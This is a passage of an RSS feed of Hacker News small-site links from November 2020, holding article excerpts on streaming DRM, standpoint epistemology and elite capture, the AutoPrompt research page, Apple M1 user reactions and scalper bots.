<p>Stepping back, I can sort of understand why streaming providers do this. If I were feeling particularly generous—or, if I were in marketing—I could probably even BS together justifications about how this setup actually benefits consumers too. Something about how the Disney app is specially designed and optimized for Disney content, and how all this vertical integration provides customers with the best end-to-end user experience. After all, we’re not just talking about apps here, but entertainment experiences! On the technical side, I also know that if you control both the frontend and backend, development and maintenance are simpler.</p>

<p>But seeing as my generosity reserves are now thoroughly depleted, I must also bring up three little letters: DRM. For controlling the entire pipeline also lets streaming providers control how their content can be shared and interacted with. That sounds a whole lot like DRM to me, even if it’s not explicitly called such. The fact that the streamed media itself is also encrypted is more of an implementation detail.</p>

<hr>

<p>So what’s the impact of linking content to an app? Well, simply put, it limits user control. Any control users have must be granted by streaming providers, who currently have little incentive to grant users anything meaningful.</p>

<p>The best analogy I can think of for this setup is that of a jukebox. A jukebox lets you play a large library of songs on demand, however browsing and selecting a song is basically all the control a jukebox grants to you. You certainly aren’t allowed to take some of the records out of the machine and play them on your own record player. Nor …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.mattbierner.com/the-war-we-forgot/">https://blog.mattbierner.com/the-war-we-forgot/</a></em></p>]]>
            </description>
            <link>https://blog.mattbierner.com/the-war-we-forgot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25202726</guid>
            <pubDate>Tue, 24 Nov 2020 20:34:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Holiday Torture – VCard/vcf to CSV Converter for Address Labels]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25202644">thread link</a>) | @semireg
<br/>
November 24, 2020 | https://label.live/post/print-address-labels-using-vcard-vcf | <a href="https://web.archive.org/web/*/https://label.live/post/print-address-labels-using-vcard-vcf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://label.live/post/print-address-labels-using-vcard-vcf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25202644</guid>
            <pubDate>Tue, 24 Nov 2020 20:27:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Being-in-the-Room Privilege: Elite Capture and Epistemic Deference]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25202553">thread link</a>) | @Reedx
<br/>
November 24, 2020 | https://www.thephilosopher1923.org/essay-taiwo | <a href="https://web.archive.org/web/*/https://www.thephilosopher1923.org/essay-taiwo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="PAGES_CONTAINER"><div id="SITE_PAGES"><div id="r36i2"><div><div id="Containerr36i2"><div data-mesh-id="Containerr36i2inlineContent" data-testid="inline-content"><div data-mesh-id="Containerr36i2inlineContent-gridContainer" data-testid="mesh-container-content"><section id="comp-khunkqfk"><div data-testid="columns"><div id="comp-khunkqgo1"><div data-mesh-id="comp-khunkqgo1inlineContent" data-testid="inline-content"><div data-mesh-id="comp-khunkqgo1inlineContent-gridContainer" data-testid="mesh-container-content"><div id="comp-khunkqgq2" data-testid="richTextElement"><p><span><span>Original Article:</span></span></p>

<p><span><span><span><span><span>Being-in-the-Room Privilege:</span></span></span></span></span></p>

<p><span><span><span><span><span>Elite Capture and Epistemic Deference </span></span></span></span></span></p>

<p><br>
<span><span><span>Olúfémi O. Táíwò </span></span></span></p></div></div></div></div></div></section><p><span><span><span><span><span>© Melody Overstreet</span></span></span></span></span></p><div id="comp-khunkqh71" data-testid="richTextElement"><div><p>“I abandoned the pitch because I don’t think I’m the right person to write this story – I have no idea what it’s like to be Black... I can send you the Google doc with my notes, too?”</p><p>

I flinched inwardly. It was an innocent and properly motivated offer: Helen, a freelance journalist, was offering to give up something for me, stemming from her concern to live out an ethos of racial justice. But I worried that it was also a trap.</p></div>



<p>Even setting aside the mistake about the power dynamics of the conversation (I am Black, but also a tenure-track professor), there was a problem here that I had seen many times before. Behind the assumption that I had experiential insight she lacked was the recognizable cultural imprint of a much discussed, polarizing perspective on knowledge and politics: standpoint epistemology.</p>



<p>If you consider a textbook definition of standpoint epistemology, it may be hard to see the controversy around this idea. The <span>International Encyclopedia of Philosophy</span> boils it down to three innocuous-sounding contentions:</p>



<p>1)&nbsp;&nbsp;&nbsp;&nbsp; Knowledge is socially situated</p>

<p>2)&nbsp;&nbsp;&nbsp;&nbsp; Marginalized people have some positional advantages in gaining some forms of knowledge</p>

<p>3)&nbsp;&nbsp;&nbsp;&nbsp; Research programs ought to reflect these facts.</p>



<p>Liam Kofi Bright argues persuasively that these contentions are derivable from a combination of 1) basic empiricist commitments, and 2) a minimally plausible account of how the social world affects what knowledge groups of people are likely to seek and find.</p>



<p>So, if the problem isn’t the basic idea, what is it?</p>



<p>I think it’s less about the core ideas and more about the prevailing norms that convert them into practice. The call to “listen to the most affected” or “centre the most marginalized” is ubiquitous in many academic and activist circles. But it’s never sat well with me. In my experience, when people say they need to “listen to the most affected”, it isn’t because they intend to set up Skype calls to refugee camps or to collaborate with houseless people. Instead, it has more often meant handing conversational authority and attentional goods to those who most snugly fit into the social categories associated with these ills – regardless of what they actually do or do not know, or what they have or have not personally experienced. In the case of my conversation with Helen, my racial category tied me more “authentically” to an experience that neither of us had had. She was called to defer to me by the rules of the game as we understood it. Even where stakes are high – where potential researchers are discussing how to understand a social phenomenon, where activists are deciding what to target – these rules often prevail.</p></div><section id="comp-khunkqh91"><div data-testid="columns"><div id="comp-khunkqhc1"><div data-mesh-id="comp-khunkqhc1inlineContent" data-testid="inline-content"><div data-mesh-id="comp-khunkqhc1inlineContent-gridContainer" data-testid="mesh-container-content"><p id="comp-khunkqhe2" data-testid="richTextElement"><h2><span>THE NORMS OF PUTTING STANDPOINT EPISTEMOLOGY INTO PRACTICE CALL FOR PRACTICES OF DEFERENCE: GIVING OFFERINGS, PASSING THE MIC, BELIEVING</span></h2></p></div></div></div></div></section><div id="comp-khunkqhg" data-testid="richTextElement"><p>The trap wasn’t <span>that</span> standpoint epistemology was affecting the conversation, but <span>how</span>. Broadly, the norms of putting standpoint epistemology into practice call for practices of deference: giving offerings, passing the mic, believing. These are good ideas in many cases, and the norms that ask us to be ready to do them stem from admirable motivations: a desire to increase the social power of marginalized people identified as sources of knowledge and rightful targets of deferential behaviour. But deferring in this way as a rule or default political orientation can actually work counter to marginalized groups’ interests, especially in elite spaces.</p>



<p>Some rooms have outsize power and influence: the Situation Room, the newsroom, the bargaining table, the conference room. Being in these rooms means being in a position to affect institutions and broader social dynamics by way of deciding what one is to say and do. Access to these rooms is itself a kind of social advantage, and one often gained through some prior social advantage. From a societal standpoint, the “most affected” by the social injustices we associate with politically important identities like gender, class, race, and nationality are disproportionately likely to be incarcerated, underemployed, or part of the 44 percent of the world’s population without internet access – and thus both left out of the rooms of power and largely ignored by the people in the rooms of power. Individuals who make it past the various social selection pressures that filter out those social identities associated with these negative outcomes are most likely to be in the room. That is, they are most likely to be in the room precisely because of ways in which they are systematically <span>different from</span> (and thus potentially unrepresentative of) the very people they are then asked to represent in the room.</p>



<p>I suspected that Helen’s offer was a trap. She was not the one who set it, but it threatened to ensnare us both all the same. Broader cultural norms – the sort set in motion by prefacing statements with “As a Black man…” – cued up a set of standpoint-respecting practices that many of us know consciously or unconsciously by rote. However, the forms of deference that often follow are ultimately self-undermining and only reliably serve “elite capture”: the control over political agendas and resources by a group’s most advantaged people. If we want to use standpoint epistemology to challenge unjust power arrangements, it’s hard to imagine how we could do worse.</p>

<p><br>
***</p></div><div id="comp-khunkqhr" data-testid="richTextElement"><p>To say what’s wrong with the popular, deferential applications of standpoint epistemology, we need to understand what makes it popular. A number of cynical answers present themselves: some (especially the more socially advantaged) don’t genuinely want social change – they just want the <span>appearance</span> of it. Alternatively, deference to figures from oppressed communities is a performance that sanitizes, apologizes for, or simply distracts from the fact that the deferrer has enough “in the room” privilege for their “lifting up” of a perspective to be of consequence.</p>



<p>I suspect there is some truth to these views, but I am unsatisfied. Many of the people who support and enact these deferential norms are rather like Helen: motivated by the right reasons, but trusting people they share such rooms with to help them find the proper practical expression of their joint moral commitments. We don’t need to attribute bad faith to all or even most of those who interpret standpoint epistemology deferentially to explain the phenomenon, and it’s not even clear it would help. Bad “roommates” aren’t the problem for the same reason that Helen being a good roommate wasn’t the solution: the problem emerges from how the rooms themselves are constructed and managed.</p>



<p>To return to the initial example with Helen, the issue wasn’t merely that I hadn’t grown up in the kind of low-income, redlined community she was imagining. The epistemic situation was much worse than this. Many of the facts about me that made my life chances different from those of the people she was imagining were the very same facts that made me likely to be offered things on their behalf. If I<span> had</span> grown up in such a community, we probably wouldn’t have been on the phone together.</p>



<p>***</p></div><div id="comp-khunkqhs" data-testid="richTextElement"><p>Many aspects of our social system serve as filtering mechanisms, determining which interactions happen and between whom, and thus which social patterns people are in a position to observe. For the majority of the 20th century, the U.S. quota system of immigration made legal immigration with a path to citizenship almost exclusively available to Europeans (earning Hitler’s regard as the obvious “leader in developing explicitly racist policies of nationality and immigration”). But the 1965 Immigration and Nationality Act opened up immigration possibilities, with a preference for “skilled labour”.</p>



<p>My parents’ qualification as skilled labourers does much to explain their entry into the country and the subsequent class advantages and monetary resources (such as wealth) that I was born into. We are not atypical: the Nigerian-American population is one of the country’s most successful immigrant populations (what no one mentions, of course, is that the 112,000 or so Nigerian-Americans with advanced degrees is utterly dwarfed by the 82 million Nigerians who live on less than a dollar a day, or how the former fact intersects with the latter). The selectivity of immigration law helps explain the rates of educational attainment of the Nigerian diasporic community that raised me, which in turn helps explain my entry into the exclusive Advanced Placement and Honours classes in high school, which in turn helps explain my access to higher education...and so on, and so on.</p>

<p><span>​</span></p>

<p>It is easy, then, to see how this deferential form of standpoint epistemology contributes to elite capture at scale. The rooms of power and influence are at the end of causal chains that have selection effects. As you get higher and higher forms of education, social experiences narrow – some students are pipelined to PhDs and others to prisons. Deferential ways of dealing with identity can inherit the distortions caused by these selection processes.&nbsp;</p>

<p><span>​</span></p>

<p><span>​</span>But it’s equally easy to see locally – in this room, in this academic literature or field, in this conversation – why this deference seems to make sense. It is often an improvement on the epistemic procedure that preceded it: the person deferred to may well be better epistemically positioned than the others in the room. It may well be the best we can do while holding fixed most of the facts about the rooms themselves: what power resides in them, who is admitted.</p></div><div id="comp-khunkqht1" title=""><div data-testid="linkElement"><wix-image id="img_comp-khunkqht1" data-image-info="{&quot;containerId&quot;:&quot;comp-khunkqht1&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;imageData&quot;:{&quot;width&quot;:500,&quot;height&quot;:692,&quot;uri&quot;:&quot;53a28d_d7a507c6115d4060a217e2377ff9c717~mv2.jpg&quot;,&quot;name&quot;:&quot;Vessel I.jpg&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-bg-effect-name="" data-is-svg="false" data-is-svg-mask="false" data-image-zoomed=""><img alt="Vessel I.jpg"></wix-image></div></div><p id="comp-khunkqhu2" data-testid="richTextElement"><h6><span>© Melody Overstreet</span></h6></p><div id="comp-khunkqhw" data-testid="richTextElement"><p>But these are the last facts we should want to hold fixed. Doing better than the epistemic norms we’ve inherited from a history of explicit global apartheid is an awfully low bar to set. The facts that explain who ends up in which room shape our world much more powerfully than the squabbles for comparative prestige …</p></div></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thephilosopher1923.org/essay-taiwo">https://www.thephilosopher1923.org/essay-taiwo</a></em></p>]]>
            </description>
            <link>https://www.thephilosopher1923.org/essay-taiwo</link>
            <guid isPermaLink="false">hacker-news-small-sites-25202553</guid>
            <pubDate>Tue, 24 Nov 2020 20:16:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Automatic Prompt Construction for Masked Language Models]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25202409">thread link</a>) | @dennisy
<br/>
November 24, 2020 | https://ucinlp.github.io/autoprompt/ | <a href="https://web.archive.org/web/*/https://ucinlp.github.io/autoprompt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
        <div>
            <div>
                
                <div>
                    
                    
                    
                    
                    
<div>
    <p>Welcome to the webpage for AutoPrompt, an automated prompt discovery algorithm to get langauge models to do what you want..</p>

<p>The remarkable success of pretrained language models has motivated the study of what kinds of knowledge these models learn during pretraining. Reformulating tasks as fill-in-the-blanks problems (e.g., cloze tests) is a natural approach for gauging such knowledge, however, its usage is limited by the manual effort and guesswork required to write suitable prompts. To address this, we develop AutoPrompt, an automated method to create prompts for a diverse set of tasks, based on a gradient-guided search. Using AutoPrompt, we show that masked language models (MLMs) have an inherent capability to perform sentiment analysis and natural language inference without additional parameters or finetuning, sometimes achieving performance on par with recent state-of-the-art supervised models. We also show that our prompts elicit more accurate factual knowledge from MLMs than the manually created prompts on the LAMA benchmark, and that MLMs can be used as relation extractors more effectively than supervised relation extraction models. These results demonstrate that automatically generated prompts are a viable parameter-free alternative to existing probing methods, and as pretrained LMs become more sophisticated and capable, potentially a replacement for finetuning.</p>

<h2 id="paper">Paper</h2>

<p>We published the paper at the <a href="https://2020.emnlp.org/">Empirical Methods in Natural Language Processing (EMNLP)</a>.</p>



<div>
<pre>@inproceedings{autoprompt:emnlp20,
  author = {Taylor Shin and Yasaman Razeghi and Robert L. Logan IV and Eric Wallace and Sameer Singh},
  title = { {AutoPrompt}: Automatic Prompt Construction for Masked Language Models },
  booktitle = {Empirical Methods in Natural Language Processing (EMNLP)},
  year = {2020}
}
</pre>
</div>



<div>

<div>
    <div>
        
        <div>
        <figure>
            <img src="http://sameersingh.org/img/face/group/taylor.jpg" alt="Taylor Shin">
        </figure>
        </div>
        <div>
            <p>University of California, Irvine</p>
        </div>
    </div>
</div>

<div>
    <div>
        
        <div>
        <figure>
            <img src="http://sameersingh.org/img/face/group/yrazeghi.jpg" alt="Yasaman Razeghi">
        </figure>
        </div>
        <div>
            <p>University of California, Irvine</p>
        </div>
    </div>
</div>

<div>
    <div>
        
        <div>
        <figure>
            <img src="http://sameersingh.org/img/face/group/rlogan.jpg" alt="Robert L. Logan IV">
        </figure>
        </div>
        <div>
            <p>University of California, Irvine</p>
        </div>
    </div>
</div>

<div>
    <div>
        
        <div>
        <figure>
            <img src="http://sameersingh.org/img/face/group/ewallace.jpg" alt="Eric Wallace">
        </figure>
        </div>
        <div>
            <p>University of California, Berkeley</p>
        </div>
    </div>
</div>

<div>
    <div>
        
        <div>
        <figure>
            <img src="http://sameersingh.org/img/face/sameer-sq.jpg" alt="Sameer Singh">
        </figure>
        </div>
        <div>
            <p>University of California, Irvine</p>
        </div>
    </div>
</div>

</div>

</div>
                </div>
                
            </div>
        </div>
    </section></div>]]>
            </description>
            <link>https://ucinlp.github.io/autoprompt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25202409</guid>
            <pubDate>Tue, 24 Nov 2020 20:00:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating a Terraform Provider for Plausible]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25202260">thread link</a>) | @kurtmc
<br/>
November 24, 2020 | https://mcalpinefree.co.nz/blog/Technical/terraform-plausible | <a href="https://web.archive.org/web/*/https://mcalpinefree.co.nz/blog/Technical/terraform-plausible">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://mcalpinefree.co.nz/blog/Technical/terraform-plausible</link>
            <guid isPermaLink="false">hacker-news-small-sites-25202260</guid>
            <pubDate>Tue, 24 Nov 2020 19:45:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Silicon M1: Black Magic Fuckery]]>
            </title>
            <description>
<![CDATA[
Score 714 | Comments 669 (<a href="https://news.ycombinator.com/item?id=25202147">thread link</a>) | @singhkays
<br/>
November 24, 2020 | https://www.singhkays.com/blog/apple-silicon-m1-black-magic/ | <a href="https://web.archive.org/web/*/https://www.singhkays.com/blog/apple-silicon-m1-black-magic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<blockquote>
<p>Black. Magic. Fuckery.</p>
</blockquote>
<p>These are the words used by the user <a href="https://www.reddit.com/r/apple/comments/jx360c/for_context_m1_macbook_air/gcvn0oy/">holdagold on reddit</a> to describe their experience with the new Apple Silicon M1 Macbook Air. Rarely does a product leave people effusing to the extent Apple Silicon M1 has done this week. At best, you get the people who really care about a system’s internals very excited like we saw with Zen 3’s launch recently. For everyday users who just want to browse the web, stream some Netflix, maybe edit some documents, computers have been “perfectly fine” for the last decade. We’ve seen incremental year over year improvements with slightly more performance, slightly more battery life, marginally faster SSD, somewhat thinner design, etc. But something genuinely new, something revolutionary, something once in a generation has been missing. I believe the Apple M1 represents something we can truly call “revolutionary”.</p>
<p>Before we proceed, it’s essential to set the context that I’ve only used two Apple devices in my entire life - <em>a personal 2013 MacBook Air and a 2019 MacBook Pro that I got through work</em>. Everything else has been either a custom-built PC, Windows laptop, or an Android/Windows Mobile smartphone. Even for a “PC/Android Guy”, I have to admit what I saw this week is something special. I believe it’ll go down as a significant milestone in computing history on par with some industry-defining chips like Intel’s 8086, 386, 486, Pentium, Conroe or AMD’s K8, Zen, etc. I hope for the return of Moore’s law and awakening of the x86 manufacturers from their slumber as this will be the “<em>slowest</em>” CPU Apple will ever make. <em>As Henry Clay once said</em>,</p>
<blockquote>
<p>Of all human powers operating on the affairs of mankind, none is greater than that of competition.</p>
</blockquote>
<p>This blog is then my observation of the excitement around this significant launch and captures some of the user and reviewer commentary.</p>

<p>Apple launched its own M1 SoC that integrates an 8-core CPU, 8-core GPU, 16-core Neural Engine, Media encode and decode engines, RAM - all on a single-chip. By including the RAM on the SoC, Apple is marketing this as a Unified Memory Architecture (UMA), central to the performance improvements M1 brings.</p>
<figure>
<img sizes="(min-width: 35em) 1200px, 100vw" srcset="
                
                       https://www.singhkays.com/blog/apple-silicon-m1-black-magic/media/apple-silicon-M1-product-card-summary_hu0c2aa631255d48edd87f1b690f013f66_224784_480x0_resize_q75_box.jpg 480w,
                
                       https://www.singhkays.com/blog/apple-silicon-m1-black-magic/media/apple-silicon-M1-product-card-summary_hu0c2aa631255d48edd87f1b690f013f66_224784_800x0_resize_q75_box.jpg 800w,
                
                       https://www.singhkays.com/blog/apple-silicon-m1-black-magic/media/apple-silicon-M1-product-card-summary_hu0c2aa631255d48edd87f1b690f013f66_224784_1200x0_resize_q75_box.jpg 1200w,
                
                       https://www.singhkays.com/blog/apple-silicon-m1-black-magic/media/apple-silicon-M1-product-card-summary_hu0c2aa631255d48edd87f1b690f013f66_224784_1500x0_resize_q75_box.jpg 1500w,
                " src="https://www.singhkays.com/blog/apple-silicon-m1-black-magic/media/apple-silicon-M1-product-card-summary_hu0c2aa631255d48edd87f1b690f013f66_224784_800x0_resize_q75_box.jpg" alt="Apple Silicon M1 summary capabilities">
</figure>
<p>The first products and price points the M1 will be going into are:</p>
<ol>
<li>Mac Mini - $699</li>
<li>MacBook Air 13" - $999</li>
<li>MacBook Pro 13" - $1299</li>
</ol>
<p>Apple promises its new chip is much more energy-efficient than its Intel counterparts, so the battery life promises have gone up across the board:</p>
<ol>
<li>On the MacBook Air - up to 18 hours of video on a single charge (<em>up from 12 hours on this year’s Intel-powered MacBook Air</em>) and offers up to 15 hours of wireless web browsing per charge (<em>up from 11 hours previously</em>)</li>
<li>On the MacBook Pro - up to 17 hours of wireless web browsing (<em>up from 10 hours with this year’s Intel-powered MacBook Pro</em>), and 20 hours of video playback (<em>up from 10 hours before</em>).</li>
</ol>
<p>To showcase that energy efficiency, Apple is shipping the Macbook Air without any fan! It will be passively cooled like all iPhones and iPads.</p>


<p>Surprisingly no! Apple included Rosetta 2 ahead-of-time binary translation technology that translates code designed to run on Intel/x86 CPUs for the Apple Silicon CPUs. The performance is much better than expected and ranges between 70-80% of native code, which is surprising compared to Microsoft’s struggles in emulating x86 Windows apps on ARM CPUs. Apple’s answer might lie in something called TSO, aka. total store ordering as explained by <a href="https://www.reddit.com/r/hardware/comments/i0mido/apple_silicon_has_a_runtime_toggle_for_tso_to/">u/Veedrac and and u/ShaidarHaran2 on reddit</a>:</p>
<blockquote>
<p>TSO, aka. total store ordering, is a type of memory ordering, and affects how cores see the operations performed in other cores. Total store ordering is a strong guarantee provided by x86, that very roughtly means that all stores from other processors are ordered the same way for every processor, and in a reasonably consistent order, with exceptions for local memory.</p>
<p>In contrast, Arm architectures favour weaker memory models, that allows a lot of reordering of loads and stores. This has the advantage that in general there is less overhead where these guarantees are not needed, but it means that when ordering is required for correctness, you need to explicitly run instructions to ensure it. Emulating x86 would require this on practically every store instruction, which would slow emulation down a lot. That’s what the hardware toggle is for.</p>
<blockquote>
<p>In other words, Apple has, of course, been playing the very long game. TSO is quite a large benefit to emulating x86, hence why Rosetta 2 appears to put out a very decent 70% of native chip performance, that and install time translation for everything but JIT features. That’s on a chip not even meant to be a mac chip, so with further expanded caches, a wider, faster engine, perhaps applying the little cores to emulation which they’re not currently, and so on, x86_64 performance should be very very decent. I’m going to dare upset some folks and say perhaps even be faster in emulation than most contemporary x86 chips of the time, if you only lose 20% of native performance when it’s all said and done, it doesn’t take much working backwards to figure where they’d need to be, and Gurman said they were aiming for over 50% faster than Intel.</p>
</blockquote>
</blockquote>

<p>There have been numerous professional reviews and YouTube videos enumerating how Apple’s new products are better than their previous Intel counterparts. In the end, though, it comes down to how these products fit into the core workflows of the consumer who’s spending their money on them. There have been plenty of real-world experiences that I’ve seen in my filter bubble, mostly Reddit and Twitter. I will share some of these throughout this blog.</p>
<h2 id="the-speed">The Speed</h2>
<blockquote><p lang="en" dir="ltr">I pray that Intel, AMD, and Qualcomm is letting the M1 give them ideas, take them in new directions. Because this level of sorcery is too damn powerful to be held by a single company. Especially a monopolizing conglomerate like Apple. But fucking kudos to those chip wizards 👏</p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1330903542463422469?ref_src=twsrc%5Etfw">November 23, 2020</a></blockquote>
<blockquote><div lang="en" dir="ltr"><p>Purchased a new MacBook Air w/ Apple's M1 chip. </p><p>Holy crap. </p><p>Everything is WICKED fast.</p><p>Windows and prompts pop up instantly. Slowdown NEVER happens — even w/ numerous apps going. </p><p>Evernote, always a resources hog for me, is now a non-issue.</p><p>Huge props, Apple. 👍</p></div>— JP Mangalindan (@JPManga) <a href="https://twitter.com/JPManga/status/1329265657796390914?ref_src=twsrc%5Etfw">November 19, 2020</a></blockquote>
<blockquote><p lang="en" dir="ltr">Have had my M1 MacBook for about a week now... and have been blown away by the performance. Battery just last and lasts, and either the fan never runs or is inaudible. Everything seems faster, even the stuff not yet compiled for Apple Silicon.</p>— Blake Scholl 🛫 (@bscholl) <a href="https://twitter.com/bscholl/status/1331084298451963904?ref_src=twsrc%5Etfw">November 24, 2020</a></blockquote>
<p><a href="https://www.reddit.com/r/apple/comments/jxqyio/the_macbook_air_is_once_again_the_benchmark_by/gczfgs9">u/MagneticGray on reddit</a>:</p>
<blockquote>
<p>Definitely don’t get near one! I have the 12.9” iPad Pro, new Max iPhone, older 13”MBP, and a beastly gaming PC. Our IT guy got the new MacBook Pro today and after playing with it for 10 minutes I was already rearranging my finances in my head.</p>
<p>People keep saying this but it’s eerily fast and silent, like alien technology. I exported a 5 minute clip in unoptimized Premiere Pro and I swear it did it faster than my PC with a 2070 ever has. The MBP wasn’t even warm to the touch afterwards either.</p>
</blockquote>
<p><a href="https://www.reddit.com/r/apple/comments/jx360c/for_context_m1_macbook_air/gctzgic/">u/leach4_pikes on reddit</a>:</p>
<blockquote>
<p>&gt; It’s honestly the best purchase I’ve made in the last 10 years.</p>
<p>This is exactly how I feel. Feels like I’m holding a magical device that shouldn’t exist. Haven’t felt that in a long long time</p>
</blockquote>
<p><a href="https://www.reddit.com/r/apple/comments/jxu58m/apple_m1_arm_performance_with_a_2020_mac_mini/gd082ng/">u/lawrencejuliano and u/havaloc on reddit</a>:</p>
<blockquote>
<p>I have a 2018 15” MacBook Pro which is used almost exclusively in clamshell mode these days and attached to an ultrawide monitor. I use it mainly for photoshop and Lightroom for my photography work, and it’s been painful to say the least. It’s quick for all of two minutes until the fan kicks in with the thermal throttling, at which point the machine chugs to a crawl. I’ve been wanting to get a desktop in replacement, eyeing the previous gen Mac Minis but unable to make the move due to the lack of discrete GPU and an inability to push my monitor’s resolution.</p>
<p>In comes the M1 Mac Mini - I ordered right away and received it Tuesday, and my god has it been a breath of fresh air. First impressions were insanely positive, even hooked to my 5120x1440 display it was lightning fast. But yesterday I put it through the paces with edits from a recent shoot, and it was beyond stellar. More photoshop tabs open than ever before, Lightroom CC and classic open together, nothing could slow it down.</p>
<p>To say I’m impressed with this first gen is a massive understatement, this is shaping up to be one of the most enjoyable devices I’ve ever owned. First computer that hasn’t had some feeling of compromise in a long time.</p>
</blockquote>

<h2 id="buyers-remorse-is-real">Buyers remorse is real</h2>
<p><a href="https://www.reddit.com/r/apple/comments/jxqyio/_/gcyyfjl">u/afelzz and u/WizardSleeveLoverr on reddit</a>:</p>
<blockquote>
<p>I feel so fucking stupid for ordering a Macbook Air in April this year.</p>
<blockquote>
<p>Same. I’m mad at myself. I ordered a MacBook Pro around the same time and of course this comes out. Trade in value is a joke too.</p>
</blockquote>
</blockquote>
<p><a href="https://www.reddit.com/r/apple/comments/jxqyio/_/gd0n94p">u/2shizhtzu4u on reddit</a>:</p>
<blockquote>
<p>I was stupid to by [sic] the early 2020 model. Sent it back today in exchange for this one. The performance on the M1 is far more than what I expected</p>
</blockquote>
<p><a href="https://www.reddit.com/r/apple/comments/jxqyio/_/gczjpa8">u/kelev on reddit</a>:</p>
<blockquote>
<p>As someone who got an entry level 2020 MBP in June… fuck.</p>
</blockquote>
<p><a href="https://www.reddit.com/r/apple/comments/jx360c/_/gcu471l">u/hijusthappytobehere, u/CanadianMapleBacon and u/takesthebiscuit on reddit</a>:</p>
<blockquote>
<p><em>cries in 2020 MBP</em></p>
<blockquote>
<p>2020 MacBook Air purchased in August :(:(:(</p>
</blockquote>
<blockquote>
<p>Ha my dad is 5 months into his MBP gutted</p>
</blockquote>
</blockquote>
<p><a href="https://www.reddit.com/r/apple/comments/jx360c/for_context_m1_macbook_air/gcvvtju/">u/mraheem on reddit</a>:</p>
<blockquote>
<p>Sucks cause i just bought a MacBook 3 years ago. And that battery is super super appealing.</p>
</blockquote>
<h2 id="battery-life-is-insane">Battery life is insane!</h2>
<blockquote><div lang="en" dir="ltr"><p>I haven’t plugged in this M1 Mac in almost 2 days. It’s only half dead. lol. What is this sorcery? 🔋 </p><p>Apple Silicon Macs are the future, man. Competing laptops are gonna have a hard time catching up. <a href="https://t.co/FmX5uVKkFd">pic.twitter.com/FmX5uVKkFd</a></p></div>— Computer Clan (📌M1) (@thecomputerclan) <a href="https://twitter.com/thecomputerclan/status/1329611818847891460?ref_src=twsrc%5Etfw">November 20, 2020</a></blockquote>

<blockquote><div lang="en" dir="ltr"><p>The battery life on the new MacBook Pro with M1 chip is INSANE</p><p>I've been doing work on this for several hours, and it's still at 87% 🤯🤯🤯</p><p>I guess it was a good thing I got my 3 week old laptop stolen? Lol<a href="https://twitter.com/hashtag/AppleM1?src=hash&amp;ref_src=twsrc%5Etfw">#AppleM1</a> <a href="https://t.co/fENYDS235O">pic.twitter.com/fENYDS235O</a></p></div>— William Lex Ham ✊🏽🧢 #TheyCantBurnUsAll (@WillLexHam) <a href="https://twitter.com/WillLexHam/status/1329906722845188097?ref_src=twsrc%5Etfw">November 20, 2020</a></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.singhkays.com/blog/apple-silicon-m1-black-magic/">https://www.singhkays.com/blog/apple-silicon-m1-black-magic/</a></em></p>]]>
            </description>
            <link>https://www.singhkays.com/blog/apple-silicon-m1-black-magic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25202147</guid>
            <pubDate>Tue, 24 Nov 2020 19:36:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Grinch Bots Will Steal the Best Deals This Holiday Season]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25202140">thread link</a>) | @mch82
<br/>
November 24, 2020 | https://www.softwarepundit.com/industry-research/grinch-bots-steal-holiday-deals | <a href="https://web.archive.org/web/*/https://www.softwarepundit.com/industry-research/grinch-bots-steal-holiday-deals">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Grinch bots, also known as scalper bots, have won deals at super-human speeds that consumers can't match in previous holiday seasons. However, due to the development of bots in the sneaker industry and COVID-19, the 2020 holiday season will see software bots complete a record number of online transactions.</p>
<p>In 2018, members of Congress drafted <a rel="nofollow noopener" target="_blank" title="a bill" href="https://tonko.house.gov/uploadedfiles/grinch_bots_fact_sheet.pdf">a bill</a> to outlaw grinch bots, stating that "Allowing grinch bots to rig prices and squeeze consumers during the holiday season hurts American families, small business owners, product makers and entrepreneurs. We will not allow this market manipulation to go unchecked."</p>
<p>This holiday season, grinch bots will purchase over $100 million of sneakers. In addition, this fast-growing software trend will impact clothing, collectibles, computers, electronics, gaming, and any attractive deal where demand outweighs supply. As a result, consumers will either miss out on the hottest holiday gifts, or be forced to purchase them from reseller platforms like eBay at steep markups.</p>
<p>Below, we outline what grinch bots are, how they work, and share details on the industries that are expected to be hardest hit.</p>
<p><strong>Table of Contents</strong></p>
<ul>
<li><a href="#what-are-grinch-bots">What Are Grinch Bots?</a></li>
<li><a href="#how-do-grinch-bots-work">How Do Grinch Bots Work?</a></li>
<li><a href="#grinch-bots-over-500-million">Grinch Bots Will Purchase Over $100 Million of Sneakers During the 2020 Holidays</a></li>
